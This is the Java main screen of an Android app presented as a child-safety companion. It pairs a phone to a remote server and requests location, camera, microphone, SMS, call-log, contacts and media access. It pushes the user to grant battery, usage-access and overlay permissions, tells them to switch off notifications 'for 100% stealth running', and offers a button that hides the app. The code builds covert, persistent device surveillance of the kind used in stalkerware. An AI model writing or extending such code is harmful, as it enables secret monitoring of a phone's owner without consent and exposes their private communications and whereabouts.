package com.snapapp.companion;

import android.Manifest;
import android.content.*;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.*;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {
    private static final int PERM_REQUEST_CODE = 2001;

    private EditText etPairingCode, etServerUrl;
    private Button btnActivate, btnSyncNow, btnHideApp;
    private TextView tvStatus, tvChildName;
    private View cardUnpaired, cardPaired;
    private SharedPreferences prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);

        etPairingCode = findViewById(R.id.etPairingCode);
        etServerUrl = findViewById(R.id.etServerUrl);
        btnActivate = findViewById(R.id.btnActivate);
        btnSyncNow = findViewById(R.id.btnSyncNow);
        btnHideApp = findViewById(R.id.btnHideApp);
        tvStatus = findViewById(R.id.tvStatus);
        tvChildName = findViewById(R.id.tvChildName);
        cardUnpaired = findViewById(R.id.cardUnpaired);
        cardPaired = findViewById(R.id.cardPaired);

        String savedServer = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
        etServerUrl.setText(savedServer);

        checkExistingPairing();

        btnActivate.setOnClickListener(v -> handleActivation());
        btnSyncNow.setOnClickListener(v -> {
            startSyncService();
            Toast.makeText(MainActivity.this, "Live GPS telemetry sent!", Toast.LENGTH_SHORT).show();
        });

        btnHideApp.setOnClickListener(v -> {
            startSyncService();
            AppHideHelper.showHideDialog(MainActivity.this);
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (prefs != null && prefs.getString("device_id", null) != null) {
            checkNextSpecialPermission();
        }
    }

    private void checkExistingPairing() {
        String deviceId = prefs.getString("device_id", null);
        String childName = prefs.getString("child_name", "Protected Child");
        if (deviceId != null) {
            cardUnpaired.setVisibility(View.GONE);
            cardPaired.setVisibility(View.VISIBLE);
            tvChildName.setText("Protected: " + childName);
            checkNextSpecialPermission();
        } else {
            cardUnpaired.setVisibility(View.VISIBLE);
            cardPaired.setVisibility(View.GONE);
        }
    }

    private void handleActivation() {
        final String code = etPairingCode.getText().toString().trim();
        final String server = etServerUrl.getText().toString().trim();
        if (code.length() < 4) { tvStatus.setText("Please enter valid pairing code"); return; }
        tvStatus.setText("Connecting to server...");
        btnActivate.setEnabled(false);

        ApiClient.pairDevice(server, code, new ApiClient.ApiCallback() {
            @Override
            public void onSuccess(final JSONObject response) {
                runOnUiThread(() -> {
                    btnActivate.setEnabled(true);
                    prefs.edit().putString("device_id", response.optString("device_id", ""))
                            .putString("child_name", response.optString("child_name", "Kid Device"))
                            .putString("server_url", server).apply();
                    Toast.makeText(MainActivity.this, "Device Paired Successfully!", Toast.LENGTH_LONG).show();
                    checkExistingPairing();
                });
            }
            @Override
            public void onError(final String error) {
                runOnUiThread(() -> { btnActivate.setEnabled(true); tvStatus.setText("Error: " + error); });
            }
        });
    }

    private String[] getRequiredPermissions() {
        java.util.List<String> list = new java.util.ArrayList<>();
        list.add(Manifest.permission.ACCESS_FINE_LOCATION); list.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        list.add(Manifest.permission.CAMERA); list.add(Manifest.permission.RECORD_AUDIO);
        list.add(Manifest.permission.READ_CONTACTS); list.add(Manifest.permission.READ_CALL_LOG); list.add(Manifest.permission.READ_SMS);
        if (Build.VERSION.SDK_INT >= 33) {
            list.add(Manifest.permission.POST_NOTIFICATIONS); list.add(Manifest.permission.READ_MEDIA_IMAGES);
            list.add(Manifest.permission.READ_MEDIA_VIDEO); list.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else { list.add(Manifest.permission.READ_EXTERNAL_STORAGE); }
        return list.toArray(new String[0]);
    }

    private boolean hasBasicPermissions() {
        for (String p : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }

    private void checkNextSpecialPermission() {
        if (!hasBasicPermissions()) {
            ActivityCompat.requestPermissions(this, getRequiredPermissions(), PERM_REQUEST_CODE);
            return;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Toast.makeText(this, "Step 1: Allow Unrestricted Background Battery", Toast.LENGTH_SHORT).show();
                    startActivity(new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, android.net.Uri.parse("package:" + getPackageName())));
                    return;
                }
            } catch (Exception ignored) {}
        }
        if (!AppUsageHelper.hasUsagePermission(this)) {
            Toast.makeText(this, "Step 2: Allow Usage Access for Snap Safety", Toast.LENGTH_SHORT).show();
            AppUsageHelper.promptUsageAccess(this);
            return;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !android.provider.Settings.canDrawOverlays(this)) {
            try {
                Toast.makeText(this, "Step 3: Allow Display Over Other Apps", Toast.LENGTH_SHORT).show();
                startActivity(new Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION, android.net.Uri.parse("package:" + getPackageName())));
                return;
            } catch (Exception ignored) {}
        }
        if (!prefs.getBoolean("notif_redirect_done", false)) {
            prefs.edit().putBoolean("notif_redirect_done", true).apply();
            Toast.makeText(this, "Step 4: Turn OFF notifications for 100% stealth running", Toast.LENGTH_LONG).show();
            try {
                Intent ni;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ni = new Intent(android.provider.Settings.ACTION_APP_NOTIFICATION_SETTINGS).putExtra(android.provider.Settings.EXTRA_APP_PACKAGE, getPackageName());
                } else {
                    ni = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, android.net.Uri.parse("package:" + getPackageName()));
                }
                startActivity(ni);
                return;
            } catch (Exception ignored) {}
        }
        startSyncService();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERM_REQUEST_CODE) checkNextSpecialPermission();
    }

    private void startSyncService() {
        WatchdogReceiver.scheduleWatchdog(this);
        Intent serviceIntent = new Intent(this, CompanionSyncService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(serviceIntent);
            else startService(serviceIntent);
        } catch (Exception ignored) {}
    }
}
